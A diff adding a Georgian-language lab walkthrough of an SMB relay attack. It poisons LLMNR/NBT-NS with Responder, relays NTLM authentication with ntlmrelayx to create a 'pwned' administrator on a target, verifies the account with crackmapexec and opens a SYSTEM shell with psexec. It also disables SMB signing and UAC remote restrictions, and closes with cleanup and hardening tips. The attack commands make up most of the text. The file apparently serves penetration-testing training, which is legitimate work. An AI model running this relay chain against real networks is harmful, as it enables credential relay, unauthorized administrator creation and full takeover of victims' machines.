@@ -1,0 +1,87 @@
+# SMB Relay შეტევა
+# Kali (Attacker) – 192.168.56.10
+# Win10 (Victim-Client) – 192.168.56.20
+# Win2019/Win10 (Target-Server) – 192.168.56.30
+# მიზანი - LLMNR/NBT-NS Poisoning → NTLM Relay → Target-ზე ადმინისტრატორის შექმნა (დამადასტურებელი შელი).
+
+# წინასწარი კონფიგი (Windows-ებზე, ადმინისტრატორის PowerShell)
+# ორივე Windows-ზე (Victim და Target), რომ შედეგი გარანტირებული იყოს:
+
+# ერთნაირი ლოკალური ადმინი ორივეგან
+net user labadmin "Passw0rd!23" /add
+net localgroup Administrators labadmin /add
+
+# ახლო ადმინისტრაციის ნებართვა ლოკალური ანგარიშით (UAC remote)
+New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
+ -Name LocalAccountTokenFilterPolicy -Value 1 -PropertyType DWord -Force
+
+# File and Printer Sharing ღია იყოს
+Set-NetFirewallRule -DisplayGroup "File and Printer Sharing" -Enabled True
+
+# SMB Signing არ იყოს მოთხოვნილი Target-ზე (მაინც ასეა უმეტეს non-DC-ზე)
+Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' `
+ -Name RequireSecuritySignature -Type DWord -Value 0
+
+#kali-ს მომზადება
+sudo apt update
+sudo apt install -y responder crackmapexec impacket-scripts
+
+# Responder-ის მომზადება (Kali)
+# Responder-ს ვუთიშავთ SMB/HTTP-ს, რომ კრედენციალი ntlmrelayx-მა მიიღოს.
+sudo sed -i 's/^SMB = .*/SMB = Off/' /etc/responder/Responder.conf
+sudo sed -i 's/^HTTP = .*/HTTP = Off/' /etc/responder/Responder.conf
+
+# გაუშვი poisoningi
+sudo responder -I eth0 -wrf
+# -I eth0  -> შენი ინტერფეისი (გადაამოწმე `ip -br a`)
+# -w -r -f -> WPAD, LLMNR, NetBIOS spoofing
+
+# Relay სამიზნის განსაზღვრა (Kali)
+echo 192.168.56.30 > targets.txt
+
+# ntlmrelayx გაშვება (Kali)
+# Target-ზე ახალი ადმინის გაკეთებას ვცდით:
+
+sudo ntlmrelayx.py -tf targets.txt -smb2support \
+  -c 'cmd /c net user pwned "P@ssw0rd!23" /add && net localgroup administrators pwned /add'
+# -tf targets.txt  -> რომელ ჰოსტებზე ვრელეებთ
+# -smb2support     -> SMB2 მხარდაჭერა
+# -c '...'         -> წარმატებისას გასაშვები ბრძანება Target-ზე
+
+# aვთენტიკაციის პროვოცირება (Victim-Win10)
+# Victim-ზე გახსენი File Explorer და მისამართის ველში აკრიფე:
+\\not-exist
+#ან CMD-ში
+dir \\idontexist\share
+
+# ეს გამოიწვევს LLMNR/NBNS მოთხოვნას → Responder უპასუხებს → Victim Credentials მივა Kali-ზე → ntlmrelayx მას Target-ზე გადაRelayებს.
+
+#წარმატების შემოწმება
+# Kali-ზე ntlmrelayx ფანჯარაში უნდა დაინახო წარმატება. შემდეგ გადაამოწმე, რომ ახალი ადმინი მუშაობს:
+
+crackmapexec smb 192.168.56.30 -u pwned -p 'P@ssw0rd!23' --local-auth
+# უნდა აჩვენოს Pwn3d!
+
+# SYSTEM შელი (სერვისით) Target-ზე:
+psexec.py pwned:'P@ssw0rd!23'@192.168.56.30 cmd
+
+#თუ Pwn3d! ვერ მივიღეთ, შეამოწმე:
+
+#Target-ზე RequireSecuritySignature ნამდვილად 0ა;
+#Victim-ზე ქსელი Private და ფაილ-პრინტის ფაიర్వოლი ჩართულია;
+#ორივეგან labadmin პაროლი ერთნაირია (რელეირება NTLMv2-ზე ხდება).
+#Alternative Trigger (from Victim) — Optional
+#If the user does not manually generate any traffic, you can trigger an authentication request from the Victim machine with a simple UNC path:
+\\192.168.56.10\share
+
+#გასუფთავება
+# Cleanup (Target-Server)
+net user pwned /del
+
+#გამორთე LLMNR/NBNS, გამორთე WPAD.
+#ჩართე/მოითხოვე SMB Signing სერვერებზე (განსაკუთრებით ფაილ-სერვერებზე).
+#გამოიყენე LAPS (უნიკალური ლოკალური ადმინის პაროლები).
+#ფაირვოლი: დახურე 137/138/139/445 სადაც არ არის საჭირო.
+#ეს ლაბი გარანტირებულად გაძლევს „დამადასტურებელ შედეგს“ — Target-ზე ადმინისტრატორის შექმნას და შემდგომ SYSTEM შელს Kali-დან.
+
+
